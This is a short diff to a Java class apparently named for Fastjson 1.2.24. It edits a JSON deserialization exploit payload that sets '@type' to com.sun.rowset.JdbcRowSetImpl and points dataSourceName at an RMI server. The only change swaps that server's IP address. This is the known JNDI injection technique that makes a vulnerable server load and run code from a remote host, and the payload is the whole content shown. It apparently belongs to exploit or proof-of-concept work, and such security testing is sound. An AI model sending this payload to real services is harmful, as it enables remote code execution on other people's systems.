@@ -8,7 +8,7 @@ public class fastjson_1_2_24 {
     {
     "b":{
     "@type":"com.sun.rowset.JdbcRowSetImpl",
-            "dataSourceName":"rmi://10.41.230.66:1099/1ado0p",
+            "dataSourceName":"rmi://10.58.120.200:1099/1ado0p",
             "autoCommit":true
     }
     }
